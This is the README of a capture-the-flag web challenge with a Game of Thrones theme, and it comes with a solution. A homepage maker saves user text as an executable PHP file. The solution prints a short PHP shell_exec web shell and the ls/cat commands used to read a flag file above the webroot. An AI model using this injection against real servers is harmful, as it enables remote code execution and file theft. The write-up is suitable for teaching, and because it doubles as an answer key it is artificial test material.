# Personalized Homepage

Samwell Tarly is helping people set up their homepages so that they
can increase their popularity and attract more people to fight against
the night king.

To do that, he has set up a Homepage Maker. Bran saw Samwell hiding something
in a file called flag.txt in his visions. Help Bran locate that file.

# Running Instructions

The directory structure should be maintained, with `webroot` being the php
root folder, and flag.txt being in the directory above it.

# Solution

This question allows you to create a `homepage.php` file on your own,
which is populated with the contents of whatever you put in the text box
in the index page.

You can also php code in it and it will run.

```
<?php
        echo shell_exec("command");
?>
```

Replace command with `ls` or `cat flag.txt`, to obtain a cryptic hint, which
will lead you to execute `ls ..` and `cat ../flag.txt`. This is the flag.